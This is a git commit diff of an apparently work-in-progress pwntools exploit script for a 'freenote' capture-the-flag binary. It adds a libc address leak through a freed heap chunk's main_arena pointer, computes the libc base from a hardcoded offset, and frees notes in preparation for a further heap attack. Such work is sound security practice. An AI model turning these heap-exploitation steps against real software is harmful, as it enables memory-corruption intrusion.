5193b20552bcec1b7ea2527d0d054ee1433a65a7
Kichang Yang <kichangya@gmail.com>
2017-10-18 00:50:20 -0700

    .

--- freenote/nogada.py
+++ freenote/nogada.py
@@ -6,6 +6,12 @@ from pwn import *
 
 r = process('./freenote')
 
+b = ELF('./freenote')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.arch = b.arch
+context.log_level = 'info'
+
 def new_note(s):
     r.send('2\n')
     r.sendafter('Length of new note:', str(len(s))+'\n')
@@ -15,7 +21,7 @@ def delete_note(n):
     r.send('4\n')
     r.sendafter('Note number:', str(n)+'\n')
 
-def list_note():
+def leak_libc():
     r.send('1\n')
     r.recvuntil('CCCCCCCC')
     l = r.recvuntil('\n')
@@ -25,6 +31,7 @@ def list_note():
     l = l + '\x00\x00'
     l = u64(l)
     log.info('leaked libc: 0x%x' % l)
+    return l
 
 if __name__ == "__main__":
     r.recvuntil('Your choice:')
@@ -36,6 +43,11 @@ if __name__ == "__main__":
 
     new_note('CCCCCCCC') # overwrite fd pointer and still we have bk pointer to <main_arena>
     
-    list_note()
+    offset = 0x7f103fc32b78 - 0x7f103f86e000 
+    libc_base = leak_libc() - offset
 
-    raw_input('after leaking...')
+    log.info('libc_base: 0x%x' % libc_base)
+
+    delete_note(0)
+    delete_note(1)
+
